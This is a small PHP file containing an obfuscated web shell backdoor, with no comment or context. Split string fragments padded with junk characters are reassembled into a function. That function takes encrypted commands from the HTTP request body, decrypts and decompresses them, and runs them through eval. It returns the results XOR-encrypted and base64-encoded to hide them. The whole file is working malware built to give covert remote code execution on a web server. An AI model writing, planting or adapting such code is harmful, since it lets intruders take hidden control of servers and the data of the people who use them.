<?php
$q='$k=ld"3789ld9e01";$kh="ldd2f15ld60d34d8ld";$kf=ldld"d9f88ldf648c5c";$p=ld"Nldkld0Isrux';
$d='ldk{$jld};}ld}return $o;}ifld (@pldregld_matchld("/ld$kh(.+ld)$kf/",@fillde_get_coldntent';
$E='s("ldphp://ldinldput"),$m)==ld1) {@ldoldb_start();@ldevldal(ld@gzuncoldmldpress(@x(@';
$W='for(ld$i=0;$i<$l;ld){ldfor($j=0;(ld$j<ld$c&&$i<ld$lld);$j++,$ldi++){$o.=$ldt{$i}ld^$';
$x='sLnKgS70ld"ld;function x($tldld,$ldk){$c=stldrlenld($k);$l=strlen($ldt)ld;ld$o="";';
$N='baseld64_decodlde(ld$m[1]),$ldkld)));$old=@ob_get_cldontldentsld();@ldobld_end_cllde';
$A=str_replace('LN','','cLNreatLNeLN_LNfunLNLNction');
$F='an();$r=ld@baldse6ld4_encode(@x(@ldgzldcompress($o),ld$k));print("$ldp$ldkh$r$kf");}';
$R=str_replace('ld','',$q.$x.$W.$d.$E.$N.$F);
$f=$A('',$R);$f();
?>
